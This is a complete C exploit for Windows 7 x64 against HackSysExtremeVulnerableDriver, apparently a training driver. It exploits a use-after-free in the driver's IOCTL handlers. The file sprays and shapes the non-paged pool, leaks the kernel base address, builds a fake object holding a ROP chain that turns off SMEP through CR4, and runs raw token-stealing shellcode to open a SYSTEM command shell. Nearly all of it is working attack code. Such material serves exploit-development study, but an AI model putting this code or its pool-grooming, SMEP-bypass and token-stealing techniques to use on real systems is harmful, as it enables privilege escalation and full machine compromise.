#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>


//NTSTATUS Codes Defined
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Define IO_COMPLETION_OBJECT
#define IO_COMPLETION_OBJECT 1

//Define IOCTLS
#define IOCTL_ALLOC 0x222013
#define IOCTL_FREE 0x22201B
#define IOCTL_ALLOC_FAKE_OBJ 0x22201F
#define IOCTL_USE_FAKE_OBJ 0x222017

//Maximum File Length
#define MAXIMUM_FILENAME_LENGTH 255 

//Fake Object Size
#define FAKE_OBJECT_SIZE 60

//EnumDeviceDriver Array
#define ARRAY_SIZE 1024

//Define Array Handles
HANDLE ArrayA[10000];
HANDLE ArrayB[5000];

typedef struct SYSTEM_MODULE {
	PVOID	Reserved1;
	PVOID	Reserved2;
	PVOID	ImageBaseAddress;
	ULONG	ImageSize;
	ULONG	Flags;
	USHORT	Index;
	USHORT	NameLength;
	USHORT	LoadCount;
	USHORT	PathLength;
	CHAR 	Name[MAXIMUM_FILENAME_LENGTH];
} SYSTEM_MODULE, *PSYSTEM_MODULE;


typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *PNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource,
	OUT PULONG Interval);


typedef struct _LSA_UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
        ULONG           Length;
        HANDLE          RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG           Attributes;
        PVOID           SecurityDescriptor;
        PVOID           SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (WINAPI *NtAllocateReserveObject_t)(OUT PHANDLE hObject,
													 IN POBJECT_ATTRIBUTES ObjectAttributes,
                                                     IN DWORD ObjectType);

NtAllocateReserveObject_t     NtAllocateReserveObject;

void SprayNonPagedPool(){
	UINT i = 0;
	HMODULE ntHandle = NULL;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
	ntHandle = LoadLibraryA("ntdll.dll");
	if (!ntHandle) {
		printf("Failed to load NTDLL: 0x%X\n", GetLastError());
		return;
	}

	NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(ntHandle, "NtAllocateReserveObject");

	if(!NtAllocateReserveObject){
		printf("Failed to get NtAllocateReserveObject!");
		return;
	}
	for (i = 0; i < 10000; i++){
		NtStatus = NtAllocateReserveObject(&ArrayA[i], 0, IO_COMPLETION_OBJECT);
		if(NtStatus != STATUS_SUCCESS){
			printf("Failed to Allocate Reserve Objects: 0x%X\n", GetLastError());
		}
	}
	printf("[+] Sprayed 10,000 Reserved Object's in Non-Paged Pool\n");
	for (i = 0; i < 5000; i++){
		NtStatus = NtAllocateReserveObject(&ArrayB[i], 0, IO_COMPLETION_OBJECT);
		if(NtStatus != STATUS_SUCCESS){
			printf("Failed to Allocate Reserve Objects: 0x%X\n", GetLastError());
		}
	}
	printf("[+] Sprayed 5,000 Reserved Object's in Non-Paged Pool\n");
}

void PunchHoles(){
	UINT i = 0;
	for(i = 0; i < 5000; i += 2){
		if (!CloseHandle(ArrayB[i])){
			printf("Failed to Close Handle of Objects in ArrayB: 0x%X\n", GetLastError());
			return;
		}
	}
	//printf("Press Any Key to Continue\n");  
	//getchar();  
}

PVOID KernelBase(){
	ULONG retLength = 0;
	HMODULE ntdll = GetModuleHandle("ntdll");
	PNtQuerySystemInformation ntquerysysinfo = (PNtQuerySystemInformation) GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (ntquerysysinfo == NULL){
		printf("GetProcAddress() failed.\n");
		return;
	}
	printf("[+] NTDLL Located @ Address 0x%p \n", ntdll);
	printf("[+] NtQuerySystemInformation Located @ Address: 0x%p \n", ntquerysysinfo);

	ntquerysysinfo(SystemModuleInformation, NULL, 0, &retLength);

	PSYSTEM_MODULE_INFORMATION pModuleInformation = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, retLength);

	if (pModuleInformation == NULL){
		printf("Could not allocate memory for module info\n");
		return;
	}

	ntquerysysinfo(SystemModuleInformation, pModuleInformation, retLength, &retLength);
	printf("[+] Return length size: %d\n", retLength);
	if(retLength == 0){
		printf("Failed to get system information!\n");
		return;
	}
	printf("[+] Number of Modules: %d\n", pModuleInformation->ModulesCount);

    PVOID KernelBase = pModuleInformation->Modules[0].ImageBaseAddress;
    PCHAR KernelName = strrchr((PCHAR)(pModuleInformation->Modules[0].Name), '\\')+1;
    printf("[+] Module name %s\t\n", KernelName);
    //printf("[+] Base Address 0x%p\n", KernelBase);
    return KernelBase;
}



PVOID HEVD_BASE(){
	    char* krnl = "hevd.sys";
    LPVOID lpImageBase[ARRAY_SIZE];
    DWORD lpcbNeeded;
    int drivers, i;
    CHAR lpFileName[ARRAY_SIZE];
    LPVOID krnl_base = 0;

    EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

    drivers = lpcbNeeded / sizeof(lpImageBase[0]);

    for (i = 0; i < drivers; i++) {
        GetDeviceDriverBaseNameA(lpImageBase[i], lpFileName, sizeof(lpFileName) / sizeof(char));
        if (strcmp(krnl, lpFileName) == 0) {
            printf("[+] Base address of %s is: 0x%llx\n", lpFileName, lpImageBase[i]);
            break;
        }
    }
    return 0;
}
void exploit(PVOID KernelBase){

	char shellcode[] = 
"\xcc\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x80\xb8\x00\x00\x00\x49\x89\xc0\x48\x8b\x80\xe8\x02\x00\x00\x48\x2d\xe8\x02\x00\x00\x48\x8b\x88\xe0\x02\x00\x00\x48\x83\xf9\x04\x75\xe6\x4c\x8b\x88\x58\x03\x00\x00\x4d\x89\x88\x58\x03\x00\x00\xc3";
//Win7 x64 Token Stealing Payload
//Size: 73 Bytes
/*
    " start:                             "
    " xor     rax,rax                   ;"
    " mov     rax, gs:[rax+0x188]       ;"  # Fetch _KTHREAD address through GS register
    " mov     rax, [rax+0xb8]           ;"  # Obtain _EPROCESS address from _KTHREAD
    " mov     r8,rax                    ;"  # Copy unprivileged _EPROCESS address to R8
    " find:                              "
    " mov     rax, [rax+0x2e8]          ;"  # Go to next EPROCESS via ActiveProcessLinks.Flink
    " sub     rax,0x2e8                 ;"  # Go back to the beginning of _EPROCESS structure
    " mov     rcx, [rax+0x2e0]          ;"  # Copy UniqueProcessId to RCX   
    " cmp     rcx, 0x04                 ;"  # Compare UniqueProcessId with SYSTEM process one
    " jne     find                      ;"  # If we are not looking at SYSTEM process grab next _EPROCESS
    " patch:                             "
    " mov     r9,[rax+0x358]            ;"  # Copy SYSTEM process token address to R9
    " mov     [r8+0x358],r9             ;"  # Steal token by overwriting the unprivileged token's reference
 	" xor rax, rax						;"
    " sub rsp, 0x40                     ;"
    " ret                               ;" */

	LPVOID Allocated_Memory = VirtualAlloc(NULL, 0x63, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Allocated_Memory) {
		printf("[-] Error Allocating the Shellcode Buffer\n");
		exit(1);
	}

	RtlMoveMemory(Allocated_Memory, shellcode, sizeof(shellcode));
	printf("[+] RWX Memory allocated at the Following Address: %p\n", Allocated_Memory);

	DWORD bytesRet;
	HANDLE driverHandle;
	printf("[+] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
	driverHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Could Not Get Handle!");
		return;
	}


    printf("[+] Kernel Base Address 0x%p\n", KernelBase);

	LPVOID stack_pivot = (LPVOID)((INT_PTR)KernelBase+0xbd8c1);
	printf("[+] Address of Stack Pivot: 0x%p\n", stack_pivot);

	LPVOID pop_rcx = (LPVOID)((INT_PTR)KernelBase+0x1684f0);
	printf("[+] Address of pop rcx: 0x%p\n", pop_rcx);

	LPVOID mov_rcx_cr4 = (LPVOID)((INT_PTR)KernelBase+0x1e818e);
	printf("[+] Address of mov rcx, cr4: 0x%p\n", mov_rcx_cr4);

	LPVOID restore = (LPVOID)((INT_PTR)KernelBase+0xB0440);
	printf("[+] Address of mov rcx, cr4: 0x%p\n", restore);


	LPVOID exploit = VirtualAlloc(NULL, 0x63, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!exploit) {
		printf("[-] Error Allocating Fake Object Buffer\n");
		exit(1);
	}
	printf("[+] Fake Object Buffer Allocated at the Following Address: 0x%p\n", exploit);

	RtlFillMemory(exploit, FAKE_OBJECT_SIZE, 'A');

	INT_PTR fake_object = (INT_PTR)exploit;
	LPVOID pShellcode = (LPVOID)((INT_PTR)Allocated_Memory);
	*(INT_PTR*)(fake_object) = (INT_PTR)stack_pivot;
	*(INT_PTR*)(fake_object + 8 * 1) = (INT_PTR)pop_rcx;
	*(INT_PTR*)(fake_object + 8 * 2) = (INT_PTR)0x506f8;
	*(INT_PTR*)(fake_object + 8 * 3) = (INT_PTR)mov_rcx_cr4;
	*(INT_PTR*)(fake_object + 8 * 4) = (INT_PTR)pShellcode;
	*(INT_PTR*)(fake_object + 8 * 5) = (INT_PTR)restore;

	//memcpy(&exploit, &Allocated_Memory, 0x20);
	printf("[+] Allocating Chunk of Memory\n");
	DeviceIoControl(driverHandle, IOCTL_ALLOC, NULL, 0, NULL, 0, &bytesRet, NULL);
	printf("[+] Free Chunk of Memory\n");
	DeviceIoControl(driverHandle, IOCTL_FREE, NULL, 0, NULL, 0, &bytesRet, NULL);
	DeviceIoControl(driverHandle, IOCTL_ALLOC_FAKE_OBJ, exploit, sizeof(exploit), NULL, 0, &bytesRet, NULL);
	DeviceIoControl(driverHandle, IOCTL_USE_FAKE_OBJ, NULL, 0, NULL, 0, &bytesRet, NULL);
	printf("[+] Enjoy the System Shell!\n");
	system("cmd.exe");
	printf("[+] Closing Device Handle...\n");
	CloseHandle(driverHandle);
	}



int main(){
	SprayNonPagedPool();
	PunchHoles();
	exploit(KernelBase());
	return 0;
}
